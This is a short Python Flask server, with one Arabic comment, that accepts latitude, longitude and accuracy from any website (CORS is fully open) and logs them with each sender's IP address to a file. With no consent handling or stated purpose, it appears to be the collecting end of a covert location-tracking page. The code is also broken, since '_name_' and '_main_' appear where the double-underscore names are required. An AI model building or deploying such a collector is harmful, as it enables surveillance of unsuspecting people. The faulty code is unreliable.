import os
from flask import Flask, request
from datetime import datetime
from flask_cors import CORS

app = Flask(_name_)
CORS(app)  # تسمح بطلبات CORS من أي مصدر

@app.route("/location", methods=["POST"])
def receive_location():
    ip = request.remote_addr
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    acc = data.get("accuracy")

    with open("locations.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] IP: {ip}, LAT: {lat}, LON: {lon}, ACC: {acc}m\n")

    return "Location received"

@app.route("/error", methods=["POST"])
def error():
    data = request.get_json()
    err = data.get("error")

    with open("errors.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] ERROR: {err}\n")

    return "Error received"

if _name_ == "_main_":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)